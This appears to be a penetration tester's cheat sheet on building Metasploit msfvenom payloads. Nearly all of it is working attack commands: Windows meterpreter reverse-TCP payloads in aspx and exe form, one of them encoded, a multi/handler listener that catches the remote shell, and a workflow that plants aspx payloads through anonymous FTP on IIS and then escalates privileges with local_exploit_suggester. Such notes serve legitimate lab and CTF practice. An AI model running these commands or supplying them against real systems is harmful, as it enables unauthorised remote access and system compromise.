# MSFVenom — Payload Generation

Generate payload for a specific format — `-f` sets output format, redirect to file:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx > <OUTFILE>.aspx
```

Common format flags: `exe`, `aspx`, `jsp`, `php`, `elf`, `dll`, `raw`, `perl`, `python`, `bash`

Strip bad chars with `-b`, specify arch and platform explicitly when auto-detection might be wrong:

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00" -f exe -o <OUTFILE>.exe
```

Session dies immediately → encode it to reduce runtime errors (not for AV, just stability):

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -f aspx > <OUTFILE>.aspx
```

Catch the callback with multi/handler — always match payload type exactly to what msfvenom generated:

```
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
msf6 exploit(multi/handler) > run -j
```

FTP anon → aspnet_client dir visible → target runs ASPX → use `-f aspx`. IIS 7.5 + aspnet_client = always try aspx first.

Low-priv shell → local_exploit_suggester immediately → work down "appears to be vulnerable" results first, skip "could not be validated" until those fail.

> [!tip] Change LPORT for each new LPE session spawned — running two payloads on the same port causes the second to fail silently. Increment by 1 each time.